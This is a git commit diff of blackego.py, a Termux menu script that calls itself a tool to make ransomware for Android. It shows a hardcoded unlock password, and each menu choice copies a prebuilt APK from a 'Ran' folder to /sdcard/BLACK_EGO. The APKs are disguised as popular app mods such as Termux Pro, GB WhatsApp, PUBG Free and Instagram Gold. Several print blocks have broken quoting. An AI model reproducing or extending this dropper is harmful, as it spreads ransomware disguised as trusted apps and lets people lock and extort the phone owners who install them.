99184447dad10f948b58d94ce5a4e43066218dc1
bo_haydar <139859144+bohaydar@users.noreply.github.com>
2023-08-21 02:14:19 +0300

    Update blackego.py

--- blackego.py
+++ blackego.py
@@ -1,8 +1,5 @@
 import os
 os.system("clear")
-os.system("pkg install unzip")
-os.system("unzip Ran.zip")
-os.system("clear")
 print ( """\033[1;31m
          .'.:Oo..                                    ..oO:.'.
         :XMK0WKx:.            ';looool;'            .:xKW0KMXc
@@ -29,11 +26,11 @@ print ( """\033[1;31m
           xK..ON;'         ..,lkK0kk0Kkl,..         ';NO..Kx.
           ox''o0l'            ..........            'l0o''xo
              ...'                                    '...\033[1;35m
-   ______________            ______      __________              
-   ___  __ )__  /_____ _________  /__    ___  ____/______ ______ 
-   __  __  |_  /_  __ `/  ___/_  //_/    __  __/  __  __ `/  __ \ 
+   ______________            ______      __________
+   ___  __ )__  /_____ _________  /__    ___  ____/______ ______
+   __  __  |_  /_  __ `/  ___/_  //_/    __  __/  __  __ `/  __ \
    _  /_/ /_  / / /_/ // /__ _  ,<       _  /___  _  /_/ // /_/ /
-   /_____/ /_/  \__,_/ \___/ /_/|_|      /_____/  _\__, / \____/ 
+   /_____/ /_/  \__,_/ \___/ /_/|_|      /_____/  _\__, / \____/
                                                   /____/
      THE TOOL BY BO HAYDAR TO MAKE RANSOMWARE FOR ANDROID SYSTEM
                \033[0;101m\033[1;34m Ransomware Passwrd \033[1;32m : 10203040506070 \033[0;32m
@@ -45,19 +42,152 @@ print ( """\033[1;31m
     _____________________________________________________________
    |_____________________________________________________________|
 
-  \033[1;32m    [1] \033[1;31m Termux Pro\033[1;32m   [2]\033[1;31m Play Store Pro\033[1;32m [3]\033[1;31m Insta followers
+  \033[1;32m    [1] \033[1;31m Termux Pro\033[1;32m   [2]\033[1;31m Play Store Pro\033[1;32m [3]\033[1;31m Yala Lodo mod
   \033[1;32m    [4] \033[1;31m Pubg Us Free\033[1;32m [5]\033[1;31m Update System\033[1;32m  [6]\033[1;31m Tiktok followers
   \033[1;32m    [7] \033[1;31m Telegram Plus\033[1;32m[8]\033[1;31m GB WhatsApp\033[1;32m    [9]\033[1;31m Ff dimond Free
-  \033[1;32m    [10]\033[1;31m Instgram Gold\033[1;32m[00]\033[1;31m1xbet Free\033[1;32m     [hh]\033[1;31m Yala Lodo mod
+  \033[1;32m    [10]\033[1;31m Instgram Gold\033[1;32m[00]\033[1;31m1Info Tool\033[1;32m     [xx]\033[1;31m Exit The Tool
   \033[1;36m
     _____________________________________________________________
    |_____________________________________________________________|
 """)
-vvvv = input('''\033[1;34m     
+vvvv = input('''\033[1;34m
 
         Enter Ransomware Number\033[1;35m ==> √  :    ''')
 if vvvv == '' :
    os.system("python blackego.py")
+###
 elif vvvv =='1' :
-     os.system("cd Ran && cp 'Termux_Pro.apk' /sdcard/BLACK_EGO")
-     os.system("python black.ego.py")
+     os.system("cd Ran && cp -r Temrux_Pro.apk /sdcard/BLACK_EGO")
+     print ("""
+\033[1;32m
+  ___   ___  _  _ ___
+ |   \ / _ \| \| | __|
+ | |) | (_) | .` | _|
+ |___/ \___/|_|\_|___|
+\033[1;31mThe Ransmware file has
+saved to:\033[1;36m/storage/sdcard/BLACK_EGO
+\033[1;34mTo open again type :\033[1;35m python blackego.py\033[0;30m>
+     os.system("python black.ego.py""")
+###
+elif vvvv =='2' :
+     os.system("cd Ran && cp -r GooglePlayStorePro.apk /sdcard/BLACK_EGO")
+     print ("""
+\033[1;32m
+  ___   ___  _  _ ___
+ |   \ / _ \| \| | __|
+ | |) | (_) | .` | _|
+ |___/ \___/|_|\_|___|
+\033[1;31mThe Ransmware file has
+saved to:\033[1;36m/storage/sdcard/BLACK_EGO
+\033[1;34mTo open again type :\033[1;35m python blackego.py\033[0;30m>
+     os.system("python black.ego.py""")
+###
+elif vvvv =='3' :
+     os.system("cd Ran && cp -r yala_lodo.apk /sdcard/BLACK_EGO")
+     print ("""
+\033[1;32m
+  ___   ___  _  _ ___
+ |   \ / _ \| \| | __|
+ | |) | (_) | .` | _|
+ |___/ \___/|_|\_|___|
+\033[1;31mThe Ransmware file has
+saved to:\033[1;36m/storage/sdcard/BLACK_EGO
+\033[1;34mTo open again type :\033[1;35m python blackego.py\033[0;30m>
+     os.system("python black.ego.py""")
+###
+elif vvvv =='4' :
+     os.system("cd Ran && cp -r pubg_us_free.apk /sdcard/BLACK_EGO")
+     print ("""
+\033[1;32m
+  ___   ___  _  _ ___
+ |   \ / _ \| \| | __|
+ | |) | (_) | .` | _|
+ |___/ \___/|_|\_|___|
+\033[1;31mThe Ransmware file has
+saved to:\033[1;36m/storage/sdcard/BLACK_EGO
+\033[1;34mTo open again type :\033[1;35m python blackego.py\033[0;30m>
+     os.system("python black.ego.py""")
+###
+elif vvvv =='5' :
+     os.system("cd Ran && cp -r update_system.apk /sdcard/BLACK_EGO")
+     print ("""
+\033[1;32m
+  ___   ___  _  _ ___
+ |   \ / _ \| \| | __|
+ | |) | (_) | .` | _|
+ |___/ \___/|_|\_|___|
+\033[1;31mThe Ransmware file has
+saved to:\033[1;36m/storage/sdcard/BLACK_EGO
+\033[1;34mTo open again type :\033[1;35m python blackego.py\033[0;30m>
+     os.system("python black.ego.py""")
+###
+elif vvvv =='6' :
+     os.system("cd Ran && cp -r Tik_flow.apk /sdcard/BLACK_EGO")
+     print ("""
+\033[1;32m
+  ___   ___  _  _ ___
+ |   \ / _ \| \| | __|
+ | |) | (_) | .` | _|
+ |___/ \___/|_|\_|___|
+\033[1;31mThe Ransmware file has
+saved to:\033[1;36m/storage/sdcard/BLACK_EGO
+\033[1;34mTo open again type :\033[1;35m python blackego.py\033[0;30m>
+     os.system("python black.ego.py""")
+###
+elif vvvv =='7' :
+     os.system("cd Ran && cp -r Telegram_Plus.apk /sdcard/BLACK_EGO")
+     print ("""
+\033[1;32m
+  ___   ___  _  _ ___
+ |   \ / _ \| \| | __|
+ | |) | (_) | .` | _|
+ |___/ \___/|_|\_|___|
+\033[1;31mThe Ransmware file has
+saved to:\033[1;36m/storage/sdcard/BLACK_EGO
+\033[1;34mTo open again type :\033[1;35m python blackego.py\033[0;30m>
+     os.system("python black.ego.py""")
+###
+elif vvvv =='8' :
+     os.system("cd Ran && cp -r GB_WHTSABB.apk /sdcard/BLACK_EGO")
+     print ("""
+\033[1;32m
+  ___   ___  _  _ ___
+ |   \ / _ \| \| | __|
+ | |) | (_) | .` | _|
+ |___/ \___/|_|\_|___|
+\033[1;31mThe Ransmware file has
+saved to:\033[1;36m/storage/sdcard/BLACK_EGO
+\033[1;34mTo open again type :\033[1;35m python blackego.py\033[0;30m>
+     os.system("python black.ego.py""")
+###
+elif vvvv =='9' :
+     os.system("cd Ran && cp -r dimond_free.apk /sdcard/BLACK_EGO")
+     print ("""
+\033[1;32m
+  ___   ___  _  _ ___
+ |   \ / _ \| \| | __|
+ | |) | (_) | .` | _|
+ |___/ \___/|_|\_|___|
+\033[1;31mThe Ransmware file has
+saved to:\033[1;36m/storage/sdcard/BLACK_EGO
+\033[1;34mTo open again type :\033[1;35m python blackego.py\033[0;30m>
+     os.system("python black.ego.py""")
+###
+elif vvvv =='10' :
+     os.system("cd Ran && cp -r InstgramGold.apk /sdcard/BLACK_EGO")
+     print ("""
+\033[1;32m
+  ___   ___  _  _ ___
+ |   \ / _ \| \| | __|
+ | |) | (_) | .` | _|
+ |___/ \___/|_|\_|___|
+\033[1;31mThe Ransmware file has
+saved to:\033[1;36m/storage/sdcard/BLACK_EGO
+\033[1;34mTo open again type :\033[1;35m python blackego.py\033[0;30m>
+     os.system("python black.ego.py""")
+elif vvvv =='xx' :
+     print ("Exit The tool")
+     os.system("exit && clear")
+elif vvvv =='00' :
+     print ("""
+I am not responsible for everything Thank you """)
